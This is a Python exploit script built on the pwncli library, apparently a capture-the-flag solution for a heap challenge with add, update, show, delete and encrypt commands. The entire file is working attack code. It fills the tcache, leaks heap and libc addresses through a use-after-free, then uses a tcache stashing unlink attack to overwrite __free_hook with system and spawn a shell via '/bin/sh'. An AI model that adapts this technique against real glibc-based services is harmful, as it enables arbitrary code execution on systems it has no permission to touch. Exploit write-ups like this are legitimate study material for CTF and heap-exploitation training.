#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwncli import *
cli_script()
set_remote_libc('libc.so.6')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
debugB = lambda : input("\033[1m\033[33m[ATTACH ME]\033[0m")

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

def add(year, month, day, hour, minute, second, content):
    ru('input your test cmd:\n')
    payload = "add"
    payload += "#" + str(year)
    payload += "#" + str(month)
    payload += "#" + str(day)
    payload += "#" + str(hour)
    payload += "#" + str(minute)
    payload += "#" + str(second)
    payload += "#"
    payload = payload.encode() + content
    sl(payload)

def update(idx, content):
    ru('input your test cmd:\n')
    payload = "update"
    payload += "#" + str(idx)
    payload += "#"
    payload = payload.encode() + content
    sl(payload)
    

def show(idx):
    ru('input your test cmd:\n')
    payload = "show"
    payload += "#" + str(idx)
    sl(payload)

def delet(idx):
    ru('input your test cmd:\n')
    payload = "delete"
    payload += "#" + str(idx)
    sl(payload)

def encrypt(idx, offset, length):
    ru('input your test cmd:\n')
    payload = "encrypt"
    payload += "#" + str(idx)
    payload += "#" + str(offset)
    payload += "#" + str(length)
    sl(payload)

def decrypt():
    ru('input your test cmd:\n')
    payload = "decrypt"
    payload += "#" + str(idx)
    sl(payload)

#  fill tcache
for i in range(11):
    add(0x7e0, 1, 4, 19, 19, i, str(i).encode())
for i in range(6):
    delet(10-i)
debugB()

#  leak heap_base and libc_base with UAF
delet(1)
show(3)
rl()
heap_base = u64_ex(ru("\n", drop=True)) - 0x13a30
lg("heap_base")
update(3, b"1")
delet(1)
show(2)
rl()
libc_base = set_current_libc_base(u64_ex(ru("\n", drop=True)), 0x1ecbe0)
lg("libc_base")

#  tcache stashing unlink attack
update(0, b"a"*8 + p64(libc.sym.__free_hook - 4))
encrypt(0, 12,6)
update(0, b"a"*(0x2c0 - 0x10 - 6))
add(0x7e0, 1, 4, 19, 19, 59, b"/bin/sh\x00")
add(0x7e0, 1, 4, 19, 19, 58, p64(libc.sym.system)[:6])
delet(4)
delet(3)


ia()
